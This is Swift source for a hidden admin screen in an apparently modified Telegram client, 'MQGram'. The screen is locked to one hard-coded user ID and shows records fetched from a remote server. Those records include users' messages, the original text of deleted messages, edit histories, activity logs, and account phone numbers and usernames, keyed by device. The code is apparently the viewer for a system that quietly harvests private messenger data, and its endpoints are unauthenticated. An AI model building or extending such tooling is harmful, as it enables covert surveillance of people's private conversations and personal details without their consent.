// MARK: MQGram - Admin Panel Controller
// Shows database stats and records from the MQGram backend
// Only accessible to admin user ID 8228905313
import Foundation
import UIKit
import Display
import SwiftSignalKit
import TelegramPresentationData
import ItemListUI
import PresentationDataUtils
import AccountContext

// MARK: - Admin Constants

public let mqgramAdminPeerId: Int64 = 8228905313

// MARK: - API Client

private struct MQGramStatsResponse: Decodable {
    let events: Int
    let deleted_messages: Int
    let messages: Int
    let user_actions: Int
    let accounts: Int
    let edited_messages: Int
    let total_records: Int
}

private struct MQGramEventRecord: Decodable {
    let id: Int
    let device_id: String?
    let account_id: String?
    let event_type: String?
    let peer_id: String?
    let message_id: String?
    let timestamp: Double?
    let data: String?
}

private struct MQGramEventsResponse: Decodable {
    let events: [MQGramEventRecord]
    let count: Int
}

private struct MQGramDeletedMessageRecord: Decodable {
    let id: Int
    let device_id: String?
    let peer_id: String?
    let message_id: String?
    let author_name: String?
    let peer_name: String?
    let original_text: String?
    let current_text: String?
    let timestamp: Int?
    let has_media: Bool?
}

private struct MQGramDeletedMessagesResponse: Decodable {
    let deleted_messages: [MQGramDeletedMessageRecord]
    let count: Int
}

private struct MQGramMessageRecord: Decodable {
    let id: Int
    let device_id: String?
    let peer_id: String?
    let message_id: String?
    let author_name: String?
    let peer_name: String?
    let text: String?
    let timestamp: Int?
    let is_outgoing: Bool?
}

private struct MQGramMessagesResponse: Decodable {
    let messages: [MQGramMessageRecord]
    let count: Int
}

private struct MQGramAccountRecord: Decodable {
    let id: Int
    let device_id: String?
    let account_id: String?
    let phone_number: String?
    let first_name: String?
    let last_name: String?
    let username: String?
}

private struct MQGramAccountsResponse: Decodable {
    let accounts: [MQGramAccountRecord]
}

private struct MQGramUserActionRecord: Decodable {
    let id: Int
    let device_id: String?
    let account_id: String?
    let action_type: String?
    let details: String?
    let timestamp: Double?
}

private struct MQGramUserActionsResponse: Decodable {
    let user_actions: [MQGramUserActionRecord]
    let count: Int
}

private struct MQGramEditedMessageRecord: Decodable {
    let id: Int
    let device_id: String?
    let peer_id: String?
    let message_id: String?
    let previous_text: String?
    let new_text: String?
    let edit_number: Int?
}

private struct MQGramEditedMessagesResponse: Decodable {
    let edited_messages: [MQGramEditedMessageRecord]
    let count: Int
}

private final class MQGramAPIClient {
    private let session: URLSession
    private let decoder = JSONDecoder()

    init() {
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 15
        self.session = URLSession(configuration: config)
    }

    private var serverURL: String {
        let saved = UserDefaults.standard.string(forKey: "MQGram.serverURL")
        return (saved != nil && !saved!.isEmpty) ? saved! : "https://app-eoctiyon.fly.dev"
    }

    func fetchStats(completion: @escaping (MQGramStatsResponse?) -> Void) {
        fetch(endpoint: "/api/stats", type: MQGramStatsResponse.self, completion: completion)
    }

    func fetchEvents(completion: @escaping (MQGramEventsResponse?) -> Void) {
        fetch(endpoint: "/api/events", type: MQGramEventsResponse.self, completion: completion)
    }

    func fetchDeletedMessages(completion: @escaping (MQGramDeletedMessagesResponse?) -> Void) {
        fetch(endpoint: "/api/deleted-messages", type: MQGramDeletedMessagesResponse.self, completion: completion)
    }

    func fetchMessages(completion: @escaping (MQGramMessagesResponse?) -> Void) {
        fetch(endpoint: "/api/messages", type: MQGramMessagesResponse.self, completion: completion)
    }

    func fetchAccounts(completion: @escaping (MQGramAccountsResponse?) -> Void) {
        fetch(endpoint: "/api/accounts", type: MQGramAccountsResponse.self, completion: completion)
    }

    func fetchUserActions(completion: @escaping (MQGramUserActionsResponse?) -> Void) {
        fetch(endpoint: "/api/user-actions", type: MQGramUserActionsResponse.self, completion: completion)
    }

    func fetchEditedMessages(completion: @escaping (MQGramEditedMessagesResponse?) -> Void) {
        fetch(endpoint: "/api/edited-messages", type: MQGramEditedMessagesResponse.self, completion: completion)
    }

    func clearAll(completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: serverURL + "/api/clear") else {
            completion(false)
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "DELETE"
        session.dataTask(with: request) { _, response, _ in
            let httpResponse = response as? HTTPURLResponse
            completion(httpResponse?.statusCode == 200)
        }.resume()
    }

    private func fetch<T: Decodable>(endpoint: String, type: T.Type, completion: @escaping (T?) -> Void) {
        guard let url = URL(string: serverURL + endpoint) else {
            completion(nil)
            return
        }
        session.dataTask(with: url) { [weak self] data, _, error in
            guard let data = data, error == nil, let self = self else {
                completion(nil)
                return
            }
            do {
                let result = try self.decoder.decode(T.self, from: data)
                completion(result)
            } catch {
                completion(nil)
            }
        }.resume()
    }
}

// MARK: - Admin State

private struct MQGramAdminState: Equatable {
    var stats: MQGramStatsResponse?
    var isLoading: Bool
    var serverURL: String
    var selectedSection: Int
    var events: [MQGramEventRecord]?
    var deletedMessages: [MQGramDeletedMessageRecord]?
    var messages: [MQGramMessageRecord]?
    var accounts: [MQGramAccountRecord]?
    var userActions: [MQGramUserActionRecord]?
    var editedMessages: [MQGramEditedMessageRecord]?

    static func ==(lhs: MQGramAdminState, rhs: MQGramAdminState) -> Bool {
        return lhs.isLoading == rhs.isLoading
            && lhs.serverURL == rhs.serverURL
            && lhs.selectedSection == rhs.selectedSection
            && lhs.stats?.total_records == rhs.stats?.total_records
            && lhs.stats?.events == rhs.stats?.events
            && lhs.stats?.deleted_messages == rhs.stats?.deleted_messages
            && lhs.stats?.messages == rhs.stats?.messages
            && lhs.stats?.user_actions == rhs.stats?.user_actions
            && lhs.stats?.accounts == rhs.stats?.accounts
            && lhs.stats?.edited_messages == rhs.stats?.edited_messages
            && lhs.events?.count == rhs.events?.count
            && lhs.deletedMessages?.count == rhs.deletedMessages?.count
            && lhs.messages?.count == rhs.messages?.count
            && lhs.accounts?.count == rhs.accounts?.count
            && lhs.userActions?.count == rhs.userActions?.count
            && lhs.editedMessages?.count == rhs.editedMessages?.count
    }
}

// MARK: - Entries

private enum MQGramAdminEntry: ItemListNodeEntry {
    case header(Int32, String)
    case statRow(Int32, String, String)
    case actionButton(Int32, String, MQGramAdminAction)
    case recordRow(Int32, String, String)
    case footer(Int32, String)

    enum MQGramAdminAction: Equatable {
        case refresh
        case viewEvents
        case viewDeletedMessages
        case viewMessages
        case viewAccounts
        case viewUserActions
        case viewEditedMessages
        case clearAll
        case back
    }

    var section: ItemListSectionId {
        switch self {
        case .footer: return 99
        default: return 0
        }
    }

    var stableId: Int32 {
        switch self {
        case let .header(id, _): return id
        case let .statRow(id, _, _): return id
        case let .actionButton(id, _, _): return id
        case let .recordRow(id, _, _): return id
        case let .footer(id, _): return id
        }
    }

    static func ==(lhs: MQGramAdminEntry, rhs: MQGramAdminEntry) -> Bool {
        switch lhs {
        case let .header(lId, lText):
            if case let .header(rId, rText) = rhs, lId == rId, lText == rText { return true } else { return false }
        case let .statRow(lId, lTitle, lValue):
            if case let .statRow(rId, rTitle, rValue) = rhs, lId == rId, lTitle == rTitle, lValue == rValue { return true } else { return false }
        case let .actionButton(lId, lTitle, lAction):
            if case let .actionButton(rId, rTitle, rAction) = rhs, lId == rId, lTitle == rTitle, lAction == rAction { return true } else { return false }
        case let .recordRow(lId, lTitle, lSub):
            if case let .recordRow(rId, rTitle, rSub) = rhs, lId == rId, lTitle == rTitle, lSub == rSub { return true } else { return false }
        case let .footer(lId, lText):
            if case let .footer(rId, rText) = rhs, lId == rId, lText == rText { return true } else { return false }
        }
    }

    static func <(lhs: MQGramAdminEntry, rhs: MQGramAdminEntry) -> Bool {
        return lhs.stableId < rhs.stableId
    }

    func item(presentationData: ItemListPresentationData, arguments: Any) -> ListViewItem {
        let args = arguments as! MQGramAdminArguments
        switch self {
        case let .header(_, text):
            return ItemListTextItem(presentationData: presentationData, text: .markdown(text), sectionId: self.section)
        case let .statRow(_, title, value):
            return ItemListDisclosureItem(
                presentationData: presentationData,
                title: title,
                label: value,
                sectionId: self.section,
                style: .blocks,
                disclosureStyle: .none,
                action: nil
            )
        case let .actionButton(_, title, action):
            return ItemListDisclosureItem(
                presentationData: presentationData,
                title: title,
                label: "",
                sectionId: self.section,
                style: .blocks,
                disclosureStyle: .arrow,
                action: {
                    args.performAction(action)
                }
            )
        case let .recordRow(_, title, subtitle):
            return ItemListDisclosureItem(
                presentationData: presentationData,
                title: title,
                label: subtitle,
                labelStyle: .detailText,
                sectionId: self.section,
                style: .blocks,
                disclosureStyle: .none,
                action: nil
            )
        case let .footer(_, text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        }
    }
}

// MARK: - Arguments

private final class MQGramAdminArguments {
    let performAction: (MQGramAdminEntry.MQGramAdminAction) -> Void

    init(performAction: @escaping (MQGramAdminEntry.MQGramAdminAction) -> Void) {
        self.performAction = performAction
    }
}

// MARK: - Entry Generation

private func adminEntries(state: MQGramAdminState, isRu: Bool) -> [MQGramAdminEntry] {
    var entries: [MQGramAdminEntry] = []
    var id: Int32 = 10

    if state.selectedSection == 0 {
        let headerText = isRu ? "Админ-панель MQGram. Данные из базы: \(state.serverURL)" : "MQGram Admin Panel. Data from: \(state.serverURL)"
        entries.append(.header(1, headerText))

        if state.isLoading {
            let loadingText = isRu ? "Загрузка..." : "Loading..."
            entries.append(.statRow(id, loadingText, "")); id += 1
        } else if let stats = state.stats {
            let totalLabel = isRu ? "Всего записей" : "Total Records"
            entries.append(.statRow(id, totalLabel, "\(stats.total_records)")); id += 1
            let eventsLabel = isRu ? "События" : "Events"
            entries.append(.statRow(id, eventsLabel, "\(stats.events)")); id += 1
            let deletedLabel = isRu ? "Удалённые сообщения" : "Deleted Messages"
            entries.append(.statRow(id, deletedLabel, "\(stats.deleted_messages)")); id += 1
            let messagesLabel = isRu ? "Сообщения" : "Messages"
            entries.append(.statRow(id, messagesLabel, "\(stats.messages)")); id += 1
            let actionsLabel = isRu ? "Действия" : "User Actions"
            entries.append(.statRow(id, actionsLabel, "\(stats.user_actions)")); id += 1
            let accountsLabel = isRu ? "Аккаунты" : "Accounts"
            entries.append(.statRow(id, accountsLabel, "\(stats.accounts)")); id += 1
            let editedLabel = isRu ? "Редактированные" : "Edited Messages"
            entries.append(.statRow(id, editedLabel, "\(stats.edited_messages)")); id += 1
        } else {
            let errorText = isRu ? "Не удалось загрузить данные" : "Failed to load data"
            entries.append(.statRow(id, errorText, "")); id += 1
        }

        id = 100
        let refreshLabel = isRu ? "Обновить" : "Refresh"
        entries.append(.actionButton(id, refreshLabel, .refresh)); id += 1

        id = 200
        let viewEventsLabel = isRu ? "Просмотр событий" : "View Events"
        entries.append(.actionButton(id, viewEventsLabel, .viewEvents)); id += 1
        let viewDeletedLabel = isRu ? "Просмотр удалённых" : "View Deleted Messages"
        entries.append(.actionButton(id, viewDeletedLabel, .viewDeletedMessages)); id += 1
        let viewMessagesLabel = isRu ? "Просмотр сообщений" : "View Messages"
        entries.append(.actionButton(id, viewMessagesLabel, .viewMessages)); id += 1
        let viewAccountsLabel = isRu ? "Просмотр аккаунтов" : "View Accounts"
        entries.append(.actionButton(id, viewAccountsLabel, .viewAccounts)); id += 1
        let viewActionsLabel = isRu ? "Просмотр действий" : "View User Actions"
        entries.append(.actionButton(id, viewActionsLabel, .viewUserActions)); id += 1
        let viewEditedLabel = isRu ? "Просмотр редактированных" : "View Edited Messages"
        entries.append(.actionButton(id, viewEditedLabel, .viewEditedMessages)); id += 1

        id = 900
        let clearLabel = isRu ? "Очистить все данные" : "Clear All Data"
        entries.append(.actionButton(id, clearLabel, .clearAll))
    } else {
        let backLabel = isRu ? "← Назад" : "← Back"
        entries.append(.actionButton(5, backLabel, .back))

        id = 10
        switch state.selectedSection {
        case 1: // Events
            let title = isRu ? "События (\(state.events?.count ?? 0))" : "Events (\(state.events?.count ?? 0))"
            entries.append(.header(1, title))
            if let events = state.events {
                if events.isEmpty {
                    let emptyText = isRu ? "Нет событий" : "No events"
                    entries.append(.recordRow(id, emptyText, "")); id += 1
                } else {
                    for event in events.prefix(50) {
                        let title = "[\(event.id)] \(event.event_type ?? "unknown")"
                        let sub = "peer: \(event.peer_id ?? "-") | \(event.data ?? "-")"
                        entries.append(.recordRow(id, title, sub)); id += 1
                    }
                }
            }

        case 2: // Deleted Messages
            let title = isRu ? "Удалённые (\(state.deletedMessages?.count ?? 0))" : "Deleted (\(state.deletedMessages?.count ?? 0))"
            entries.append(.header(1, title))
            if let msgs = state.deletedMessages {
                if msgs.isEmpty {
                    let emptyText = isRu ? "Нет удалённых сообщений" : "No deleted messages"
                    entries.append(.recordRow(id, emptyText, "")); id += 1
                } else {
                    for msg in msgs.prefix(50) {
                        let title = "[\(msg.id)] \(msg.author_name ?? msg.peer_name ?? "unknown")"
                        let text = msg.original_text ?? msg.current_text ?? "-"
                        let sub = String(text.prefix(80))
                        entries.append(.recordRow(id, title, sub)); id += 1
                    }
                }
            }

        case 3: // Messages
            let title = isRu ? "Сообщения (\(state.messages?.count ?? 0))" : "Messages (\(state.messages?.count ?? 0))"
            entries.append(.header(1, title))
            if let msgs = state.messages {
                if msgs.isEmpty {
                    let emptyText = isRu ? "Нет сообщений" : "No messages"
                    entries.append(.recordRow(id, emptyText, "")); id += 1
                } else {
                    for msg in msgs.prefix(50) {
                        let title = "[\(msg.id)] \(msg.author_name ?? msg.peer_name ?? "unknown")"
                        let text = msg.text ?? "-"
                        let sub = String(text.prefix(80))
                        entries.append(.recordRow(id, title, sub)); id += 1
                    }
                }
            }

        case 4: // Accounts
            let title = isRu ? "Аккаунты (\(state.accounts?.count ?? 0))" : "Accounts (\(state.accounts?.count ?? 0))"
            entries.append(.header(1, title))
            if let accs = state.accounts {
                if accs.isEmpty {
                    let emptyText = isRu ? "Нет аккаунтов" : "No accounts"
                    entries.append(.recordRow(id, emptyText, "")); id += 1
                } else {
                    for acc in accs.prefix(50) {
                        let name = [acc.first_name, acc.last_name].compactMap { $0 }.joined(separator: " ")
                        let title = "[\(acc.id)] \(name.isEmpty ? (acc.account_id ?? "unknown") : name)"
                        let sub = "@\(acc.username ?? "-") | \(acc.phone_number ?? "-")"
                        entries.append(.recordRow(id, title, sub)); id += 1
                    }
                }
            }

        case 5: // User Actions
            let title = isRu ? "Действия (\(state.userActions?.count ?? 0))" : "Actions (\(state.userActions?.count ?? 0))"
            entries.append(.header(1, title))
            if let actions = state.userActions {
                if actions.isEmpty {
                    let emptyText = isRu ? "Нет действий" : "No actions"
                    entries.append(.recordRow(id, emptyText, "")); id += 1
                } else {
                    for action in actions.prefix(50) {
                        let title = "[\(action.id)] \(action.action_type ?? "unknown")"
                        let sub = action.details ?? "-"
                        entries.append(.recordRow(id, title, sub)); id += 1
                    }
                }
            }

        case 6: // Edited Messages
            let title = isRu ? "Редактированные (\(state.editedMessages?.count ?? 0))" : "Edited (\(state.editedMessages?.count ?? 0))"
            entries.append(.header(1, title))
            if let msgs = state.editedMessages {
                if msgs.isEmpty {
                    let emptyText = isRu ? "Нет редактированных" : "No edited messages"
                    entries.append(.recordRow(id, emptyText, "")); id += 1
                } else {
                    for msg in msgs.prefix(50) {
                        let title = "[\(msg.id)] msg:\(msg.message_id ?? "-") edit#\(msg.edit_number ?? 0)"
                        let prev = String((msg.previous_text ?? "-").prefix(40))
                        let next = String((msg.new_text ?? "-").prefix(40))
                        let sub = "\(prev) → \(next)"
                        entries.append(.recordRow(id, title, sub)); id += 1
                    }
                }
            }

        default:
            break
        }
    }

    let footerText = isRu ? "Админ-панель MQGram. Сервер: \(state.serverURL)" : "MQGram Admin. Server: \(state.serverURL)"
    entries.append(.footer(9999, footerText))
    return entries
}

// MARK: - Controller

public func mqgramAdminController(context: AccountContext) -> ViewController {
    let apiClient = MQGramAPIClient()
    let statePromise = ValuePromise<MQGramAdminState>(MQGramAdminState(
        stats: nil,
        isLoading: true,
        serverURL: {
            let saved = UserDefaults.standard.string(forKey: "MQGram.serverURL")
            return (saved != nil && !saved!.isEmpty) ? saved! : "https://app-eoctiyon.fly.dev"
        }(),
        selectedSection: 0,
        events: nil,
        deletedMessages: nil,
        messages: nil,
        accounts: nil,
        userActions: nil,
        editedMessages: nil
    ), ignoreRepeated: true)

    var currentState = MQGramAdminState(
        stats: nil,
        isLoading: true,
        serverURL: {
            let saved = UserDefaults.standard.string(forKey: "MQGram.serverURL")
            return (saved != nil && !saved!.isEmpty) ? saved! : "https://app-eoctiyon.fly.dev"
        }(),
        selectedSection: 0,
        events: nil,
        deletedMessages: nil,
        messages: nil,
        accounts: nil,
        userActions: nil,
        editedMessages: nil
    )

    func updateState(_ f: (inout MQGramAdminState) -> Void) {
        f(&currentState)
        statePromise.set(currentState)
    }

    func loadStats() {
        updateState { $0.isLoading = true }
        apiClient.fetchStats { stats in
            DispatchQueue.main.async {
                updateState {
                    $0.stats = stats
                    $0.isLoading = false
                }
            }
        }
    }

    loadStats()

    var presentAlertImpl: ((String, String) -> Void)?

    let arguments = MQGramAdminArguments(performAction: { action in
        switch action {
        case .refresh:
            loadStats()
        case .viewEvents:
            updateState { $0.selectedSection = 1; $0.events = nil }
            apiClient.fetchEvents { response in
                DispatchQueue.main.async {
                    updateState { $0.events = response?.events ?? [] }
                }
            }
        case .viewDeletedMessages:
            updateState { $0.selectedSection = 2; $0.deletedMessages = nil }
            apiClient.fetchDeletedMessages { response in
                DispatchQueue.main.async {
                    updateState { $0.deletedMessages = response?.deleted_messages ?? [] }
                }
            }
        case .viewMessages:
            updateState { $0.selectedSection = 3; $0.messages = nil }
            apiClient.fetchMessages { response in
                DispatchQueue.main.async {
                    updateState { $0.messages = response?.messages ?? [] }
                }
            }
        case .viewAccounts:
            updateState { $0.selectedSection = 4; $0.accounts = nil }
            apiClient.fetchAccounts { response in
                DispatchQueue.main.async {
                    updateState { $0.accounts = response?.accounts ?? [] }
                }
            }
        case .viewUserActions:
            updateState { $0.selectedSection = 5; $0.userActions = nil }
            apiClient.fetchUserActions { response in
                DispatchQueue.main.async {
                    updateState { $0.userActions = response?.user_actions ?? [] }
                }
            }
        case .viewEditedMessages:
            updateState { $0.selectedSection = 6; $0.editedMessages = nil }
            apiClient.fetchEditedMessages { response in
                DispatchQueue.main.async {
                    updateState { $0.editedMessages = response?.edited_messages ?? [] }
                }
            }
        case .clearAll:
            let title = "Clear All Data"
            let message = "Are you sure you want to delete all records from the database?"
            presentAlertImpl?(title, message)
        case .back:
            updateState { $0.selectedSection = 0 }
            loadStats()
        }
    })

    let signal = combineLatest(context.sharedContext.presentationData, statePromise.get())
    |> map { presentationData, state -> (ItemListControllerState, (ItemListNodeState, Any)) in
        let isRu = presentationData.strings.baseLanguageCode.lowercased().hasPrefix("ru")
        let title = isRu ? "Админ-панель" : "Admin Panel"

        let controllerState = ItemListControllerState(
            presentationData: ItemListPresentationData(presentationData),
            title: .text(title),
            leftNavigationButton: nil,
            rightNavigationButton: nil,
            backNavigationButton: ItemListBackButton(title: presentationData.strings.Common_Back)
        )

        let entries = adminEntries(state: state, isRu: isRu)

        let listState = ItemListNodeState(
            presentationData: ItemListPresentationData(presentationData),
            entries: entries,
            style: .blocks
        )

        return (controllerState, (listState, arguments))
    }

    let controller = ItemListController(context: context, state: signal)

    presentAlertImpl = { [weak controller] title, message in
        guard let controller = controller else { return }
        let presentationData = context.sharedContext.currentPresentationData.with { $0 }
        let alertController = textAlertController(
            context: context,
            title: title,
            text: message,
            actions: [
                TextAlertAction(type: .destructiveAction, title: "Delete All", action: {
                    apiClient.clearAll { success in
                        DispatchQueue.main.async {
                            if success {
                                loadStats()
                            }
                        }
                    }
                }),
                TextAlertAction(type: .genericAction, title: presentationData.strings.Common_Cancel, action: {})
            ]
        )
        controller.present(alertController, in: .window(.root))
    }

    return controller
}
